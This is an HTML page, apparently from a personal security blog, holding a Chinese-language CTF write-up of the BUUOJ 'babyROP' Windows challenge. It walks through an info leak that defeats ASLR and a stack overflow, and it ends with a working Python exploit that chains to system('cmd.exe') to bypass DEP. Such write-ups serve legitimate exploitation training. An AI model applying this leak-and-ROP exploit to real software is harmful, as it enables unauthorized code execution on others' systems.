@@ -1,0 +1,313 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【WinPWN】栈溢出-ROP-babyROP | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【WinPWN】栈溢出-ROP-babyROP | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="程序基本信息
+
+反编译情况
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  FILE *v3; // eax
+  int i; // esi
+  ch..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【WinPWN】栈溢出-ROP-babyROP
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-10
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="程序基本信息">程序基本信息</h2>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1652113838376.png" alt="" loading="lazy"></figure>
+<h2 id="反编译情况">反编译情况</h2>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  FILE *v3; // eax
+  int i; // esi
+  char v5; // al
+  FILE *v6; // eax
+  FILE *v7; // eax
+  int v8; // esi
+  int j; // ebx
+  char v10; // al
+  FILE *v11; // eax
+  char messages[100]; // [esp+Ch] [ebp-CCh] BYREF
+  char name[100]; // [esp+70h] [ebp-68h] BYREF
+  int messagelength; // [esp+D4h] [ebp-4h] BYREF
+
+  puts(&quot;input your name&quot;);
+  v3 = _iob_func();
+  fflush(v3 + 1);
+  for ( i = 0; i &lt; 100; ++i )
+  {
+    v5 = getchar();
+    if ( v5 == 10 )
+      break;
+    name[i] = v5;
+  }
+  printf(&quot;hello %s\n&quot;, name);
+  v6 = _iob_func();
+  fflush(v6 + 1);
+  puts(&quot;input your message length&quot;);
+  v7 = _iob_func();
+  fflush(v7 + 1);
+  scanf(&quot;%d\n&quot;, &amp;messagelength);
+  v8 = 0;
+  for ( j = messagelength; v8 &lt; j; messages[v8++] = v10 )
+  {
+    v10 = getchar();
+    if ( v10 == 10 )
+      break;
+  }
+  puts(&quot;leave your message&quot;);
+  printf(&quot;your mesage is %s\n&quot;, messages);
+  printf(&quot;press enter to exit\n&quot;);
+  v11 = _iob_func();
+  fflush(v11 + 1);
+  getchar();
+  return 0;
+}
+</code></pre>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>首先看到第一处</p>
+<pre><code class="language-c">  puts(&quot;input your name&quot;);
+  v3 = _iob_func();
+  fflush(v3 + 1);
+  for ( i = 0; i &lt; 100; ++i )
+  {
+    v5 = getchar();
+    if ( v5 == 10 )
+      break;
+    name[i] = v5;
+  }
+  printf(&quot;hello %s\n&quot;, name);
+</code></pre>
+<p>在输入name的时候输入长度为100，并且name的数组长度为<code>char name[100];</code>，这样并不会造成栈溢出，但是字符串的结尾应该是<code>\x00</code> ，因此当输入长度为100字符的时候就会将末尾的 <code>\x00</code> 抹去，于是在printf函数中会将后面的数据一起打印出来：<br>
+<img src="https://limpid94.github.io/post-images/1652114958081.png" alt="" loading="lazy"><br>
+通过X32DBG进行调试，发现内存布局如下：<br>
+<img src="https://limpid94.github.io/post-images/1652115168867.png" alt="" loading="lazy"><br>
+实际上内存中紧跟name字符串后面的是msvcr100.dll中的某个函数，因此可以通过当前地址-偏移量=dll文件的基址。而用调试器查看当前程序的内存布局可以获得当前msvcr100.dll的加载基址，于是就可以得知偏移量是多少。<br>
+<img src="https://limpid94.github.io/post-images/1652179735489.png" alt="" loading="lazy"><br>
+偏移量为<code>0x7120263d-0x711f0000=0x1263d</code>，从程序信息中得知程序开启了ASLR和DEP保护，也就是每次程序启动加载的地址不一样，但是偏移量不会变动，因此结合泄露的地址就能求出每次启动时msvcr100.dll的基址。</p>
+<p>再来看第二处：</p>
+<pre><code class="language-c"> puts(&quot;input your message length&quot;);
+  v7 = _iob_func();
+  fflush(v7 + 1);
+  scanf(&quot;%d\n&quot;, &amp;messagelength);
+  v8 = 0;
+  for ( j = messagelength; v8 &lt; j; messages[v8++] = v10 )
+  {
+    v10 = getchar();
+    if ( v10 == 10 )
+      break;
+  }
+</code></pre>
+<p>这里输入的长度可控，并且输入的内容长度可以超过messages数组的长度，因此存在栈溢出漏洞。<br>
+从IDA中得知messages距离ebp的长度：<br>
+<img src="https://limpid94.github.io/post-images/1652180304744.png" alt="" loading="lazy"><br>
+也就是填充<code>0xCC+4</code>字节长度就可以控制EIP从而劫持程序流。<br>
+现在DEP保护开启使得无法把shellcode填入栈中来执行，因此需要ROP来绕过这个保护。可以利用MANO脚本来查找ropchain，也可以尝试直接从msvcr100.dll中挖掘利用点。</p>
+<p>首先在msvcr100.dll中找到system函数：<br>
+<img src="https://limpid94.github.io/post-images/1652180651947.png" alt="" loading="lazy"><br>
+其偏移地址为:<br>
+<img src="https://limpid94.github.io/post-images/1652180946490.png" alt="" loading="lazy"></p>
+<p>然后还发现存在cmd.exe字符串，但是字符串并不能直接看出偏移地址，因此先用ida加载dll文件获取当前地址，再查看其镜像基地址：<br>
+<img src="https://limpid94.github.io/post-images/1652180726880.png" alt="" loading="lazy"><br>
+然后用exeinfoPE来查看基地址：<br>
+<img src="https://limpid94.github.io/post-images/1652181119674.png" alt="" loading="lazy"><br>
+二者相减得知偏移量：<code>0x78AE3030-0x87AA0000 = 0x43030</code>，于是可以编写EXP了。</p>
+<p>需要注意的是，发生栈溢出的栈空间属于main函数，因此需要先完成最后的那个回车才能触发：<br>
+<img src="https://limpid94.github.io/post-images/1652181420191.png" alt="" loading="lazy"></p>
+<h2 id="exp">EXP</h2>
+<pre><code class="language-python">#coding:utf-8
+
+from winpwn import *
+#context.log_level = 'debug'
+context.arch = 'i386'
+
+p = process(&quot;I:\\WinPwn\\execise\\BUUOJ\\BabyROP\\babyrop.exe&quot;)
+payload = &quot;A&quot; * 0x63 + &quot;@&quot;
+p.recvuntil(&quot;name&quot;)
+p.sendline(payload)
+p.recvuntil(&quot;@&quot;)
+
+# hex(0x7120263d-0x711f0000) = 0x1263d
+dll_base = u32(p.recv(4)) - 0x1263d
+print &quot;[+] MSVCR100.DLL Base Address:&quot;,dll_base
+
+system_offset = 0x62632
+cmd_offset = 0x43030
+system_addr = dll_base + system_offset
+cmd_addr =  dll_base + cmd_offset
+payload2 = 'A'*0xCC + 'BBBB' + p32(system_addr) + p32(0xdeadbeef) + p32(cmd_addr)
+p.recvuntil(&quot;input your message length&quot;)
+p.sendline(str(256))
+p.sendline(payload2)
+p.recvuntil(&quot;press enter to exit&quot;)
+p.sendline(&quot;&quot;)
+
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1652181635681.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF">程序基本信息</a></li>
+<li><a href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E6%83%85%E5%86%B5">反编译情况</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#exp">EXP</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commonbeanutils1-li-yong-lian/">
+              <h3 class="post-title">
+                【Java反序列化】CommonBeanutils1利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
